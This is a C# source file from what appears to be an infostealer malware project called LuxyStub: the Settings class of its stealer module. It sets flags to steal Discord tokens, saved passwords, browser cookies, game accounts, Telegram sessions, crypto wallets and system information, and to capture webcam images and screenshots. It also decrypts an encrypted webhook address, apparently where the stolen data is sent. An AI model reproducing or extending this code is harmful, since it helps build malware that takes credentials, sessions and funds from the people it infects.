using System;
using System.Linq;
using System.Text;
using LuxyStub.Components.Algorithms;

namespace LuxyStub.Modules.Stealer
{
    internal static class Settings
    {
        internal static string Webhook { get; set; }

        // Stealer Settings
        internal static bool StealDiscordToken { get; set; }
        internal static bool StealPasswords { get; set; }
        internal static bool StealCookies { get; set; }
        internal static bool StealGames { get; set; }
        internal static bool StealTelegramSessions { get; set; }
        internal static bool StealSystemInfo { get; set; }
        internal static bool Network { get; set; }
        internal static bool StealWallets { get; set; }

        internal static bool TakeWebcam { get; set; }
        internal static bool TakeScreenshot { get; set; }

        static Settings()
        {
            var key = "";
            var iv = "";

            var encryptedWebhook = "";

            var stealDiscordToken = true;
            var stealPasswords = true;
            var stealCookies = true;
            var stealGames = true;
            var stealTelegramSessions = true;
            var stealSystemInfo = true;
            var network = true;
            var stealWallets = true;

            var takeWebcam = true;
            var takeSceenshot = true;

            // ---------------- Initialise variables ----------------

            var conv_key = Convert.FromBase64String(key);
            var conv_iv = Convert.FromBase64String(iv);


            Webhook = Decrypt(Convert.FromBase64String(encryptedWebhook), conv_key, conv_iv);

            StealDiscordToken = stealDiscordToken;
            StealPasswords = stealPasswords;
            StealCookies = stealCookies;
            StealGames = stealGames;
            StealTelegramSessions = stealTelegramSessions;
            StealSystemInfo = stealSystemInfo;
            Network = network;
            StealWallets = stealWallets;

            TakeWebcam = takeWebcam;
            TakeScreenshot = takeSceenshot;
        }

        static string Decrypt(byte[] encryptedData, byte[] key, byte[] iv)
        {

            var cipherText = encryptedData.Take(encryptedData.Length - 16).ToArray();
            var tag = encryptedData.Skip(encryptedData.Length - 16).ToArray();

            var aesgcm = new AesGcm();
            var decrypted = aesgcm.Decrypt(key, iv, null, cipherText, tag);

            return Encoding.UTF8.GetString(decrypted);
        }
    }
}
